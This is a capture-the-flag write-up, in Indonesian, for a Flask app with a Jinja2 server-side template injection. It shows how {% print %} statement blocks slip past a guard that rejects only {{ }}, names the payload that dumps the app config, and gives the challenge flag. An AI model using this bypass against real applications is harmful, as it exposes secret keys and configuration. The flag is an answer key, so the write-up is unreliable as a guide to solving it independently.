# Directive

## Ringkasan

Endpoint preview merender nilai `name` sebagai template Jinja2. Guard hanya menolak delimiter echo `{{ ... }}`, sementara statement block `{% ... %}` tetap diproses.

## Target dan File

Target: `http://35.192.106.100:21002/`

Artefak lokal tidak tersedia; challenge ini adalah blankbox. File solusi: `solve.py`.

## Analisis Awal

Halaman utama menyediakan form `GET /preview?name=...`. Input biasa menghasilkan:

```html
<main><h2>Welcome guest</h2><p>Enjoy the wave.</p></main>
```

Payload `{{7*7}}` ditolak dengan pesan `template guard rejected that token`.

## Source Code Review

Source code tidak disediakan. Behavior server menunjukkan Werkzeug/Flask dan evaluasi Jinja2 pada parameter `name`.

## Vulnerability

Server-side template injection (SSTI). Statement `{% print expression %}` adalah sintaks Jinja2 yang valid dan tidak terkena filter delimiter curly echo.

## Eksploitasi

Request berikut membuktikan eksekusi template:

```text
GET /preview?name={% print 7*7 %}
```

Response memuat `Welcome 49`.

Kemudian gunakan:

```text
GET /preview?name={% print config %}
```

Response HTML-escaped memuat konfigurasi Flask, termasuk:

```text
'TREASURE': '0xV01D{jinja_statement_blocks_are_templates_too}'
```

Nilai tersebut berasal langsung dari response aplikasi.

## Solve Script

`solve.py` mengirim `{% print config %}`, melakukan HTML unescape, lalu mengambil flag dari response dengan regex.

## Cara Menjalankan

```bash
source /home/nata/ctf_env/bin/activate
python3 solve.py
```

Untuk target lain yang masih berada dalam scope challenge:

```bash
TARGET=http://127.0.0.1:8000 python3 solve.py
```

## Flag

`0xV01D{jinja_statement_blocks_are_templates_too}`

## Catatan Stabilitas

Eksploitasi hanya memerlukan satu request GET dan tidak bergantung pada session atau state server.
